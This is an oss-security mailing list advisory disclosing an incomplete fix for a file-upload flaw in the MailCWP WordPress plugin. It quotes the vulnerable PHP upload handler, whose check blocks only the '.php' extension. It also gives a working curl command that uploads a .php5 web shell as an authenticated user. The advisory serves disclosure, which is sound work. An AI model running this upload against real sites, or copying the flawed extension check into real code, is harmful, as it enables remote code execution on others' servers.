  oss-security - Mailcwp remote file upload vulnerability incomplete fix            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Tue, 08 Nov From: "Larry W. Cashdollar" <larry0@...com> To: Open Source Security <oss-security@...ts.openwall.com> Subject: Mailcwp remote file upload vulnerability incomplete fix  Title: Mailcwp remote file upload vulnerability incomplete fix Author: Larry W. Cashdollar, @_larry0 Date: Download Site: https://wordpress.org/plugins/mailcwp/ Vendor: CadreWorks Pty Ltd Vendor Notified: Vendor Contact: plugins@...dpress.org Description: MailCWP, Mail Client for WordPress. A full-featured mail client plugin providing webmail access through your WordPress blog or website. Vulnerability: I noticed wasn't fixed correctly, _any_ authenticated user can upload a file to the WordPress installation, they can get .php code execution by changing the extension to .php[3-5], .pht or .phtml.  My previous advisory:    require_once "../../../wp-load.php";  if (!is_user_logged_in()) {   die('{"ERROR": -1}'); }  $message_id = $_REQUEST["message_id"]; $upload_dir = $_REQUEST["upload_dir"]; if (empty($_FILES) || $_FILES["file"]["error"]) {   die('{"OK": 0}'); }   $fileName = $_FILES["file"]["name"]; $ext = pathinfo($fileName, PATHINFO_EXTENSION); if ($ext == 'php') {   die('{"ERROR": -2}'); } move_uploaded_file($_FILES["file"]["tmp_name"], "$upload_dir/$message_id-$fileName");   die('{"OK": 1}');  Exploit Code: 	• Create any type of user and copy the contents of your cookie file for curl: 	•   	• $ curl   -F "file=@...me/larry/shell.php5" "http://example.com/wp-content/plugins/mailcwp/mailcwp-upload.php?message_id=1" -F "upload_dir=/usr/share/wordpress/wp-content/uploads" --cookie cookie.txt  	• {"OK": 1} Advisory: Notes: Incomplete fix for Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      